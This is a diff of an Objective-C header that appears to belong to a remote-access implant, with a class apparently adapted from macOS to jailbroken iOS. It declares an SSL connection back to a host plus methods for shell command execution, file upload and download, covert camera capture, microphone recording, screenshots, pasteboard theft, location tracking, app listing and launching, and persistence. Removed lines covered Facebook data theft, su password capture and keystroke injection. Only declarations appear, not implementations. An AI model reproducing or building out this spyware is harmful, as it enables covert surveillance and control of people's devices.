@@ -1,51 +1,72 @@
 #import <Foundation/Foundation.h>
+#import <AppSupport/CPDistributedMessagingCenter.h>
 #import <AVFoundation/AVFoundation.h>
 #import <AudioToolbox/AudioToolbox.h>
-#import <Appkit/Appkit.h>
+#import <CoreFoundation/CFUserNotification.h>
+#import <CoreLocation/CoreLocation.h>
+#import <MediaPlayer/MediaPlayer.h>
+#include "SpringBoardServices/SpringBoardServices.h"
 #include <openssl/bio.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include "NSTask.h"
+#include "bootstrap.h"
 #include <util.h>
 #include <sys/ttycom.h>
 #include <unistd.h>
 #include <dirent.h>
 
-@interface mpl : NSObject <AVAudioRecorderDelegate> {
+@interface mouse : NSObject <AVAudioRecorderDelegate> {
     @public
     SSL* client_ssl;
     char *terminator;
 }
 
-@property NSFileManager *fileManager;
+CFArrayRef SBSCopyApplicationDisplayIdentifiers(bool onlyActive, bool debuggable);
+extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean suspended);
+
+
+@property (retain) NSFileManager *fileManager;
+@property (retain) CPDistributedMessagingCenter *messagingCenter;
 @property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
 @property (nonatomic,strong) AVCaptureSession *session;
 @property (nonatomic,retain) AVAudioRecorder *audioRecorder;
-@property NSTask *systask;
+@property (retain) UIDevice *thisUIDevice;
+@property (retain) NSTask *systask;
 
+-(void)rocketMC:(NSString *)command;
+-(void)rocketMCWithReply:(NSString *)command;
 
+-(void)showAlert:(NSString *)args;
 -(void)changeDirectory:(NSString *)dir;
 -(void)getPasteBoard;
 -(void)runTask:(NSString *)cmd :(bool)sendTerm;
 -(void)sendFile:(NSString *)path;
 -(void)receiveFile:(NSString *)args;
+-(void)openURL:(NSString *)arg;
+-(void)openApp:(NSString *)arg;
 -(NSData *)receiveData:(long)size;
--(void)takePicture;
+-(void)takePicture:(bool)front;
 -(void)tabComplete:(NSString *)path;
 -(void)listDirectory:(NSString *)path;
 -(NSDictionary *)getDirectoryContents:(NSString *)path;
--(void)setBrightness:(NSString *)arg;
--(void)getFacebook;
 -(void)persistence:(NSString *)args :(NSString *)ip :(int)port;
 -(void)getProcessId;
+-(void)getBattery;
+-(void)getVolume;
+-(void)vibrate;
 -(void)screenshot;
--(void)su:(NSString *)pass :(NSString *)ip :(int)port;
--(void)keyStroke:(NSString *)key;
+-(void)bundleIds;
+-(void)locate;
+-(void)getPid;
+-(void)sysinfo;
+-(void)ipod:(NSString *)args;
+-(void)say:(NSString *)string;
+-(void)setVolume:(NSString *)args;
 -(void)mic:(NSString *)arg;
--(void)runAppleScript:(NSString *)args;
 -(void)debugLog:(NSString *)string;
 -(void)killTask;
--(void)idleTime;
 @end
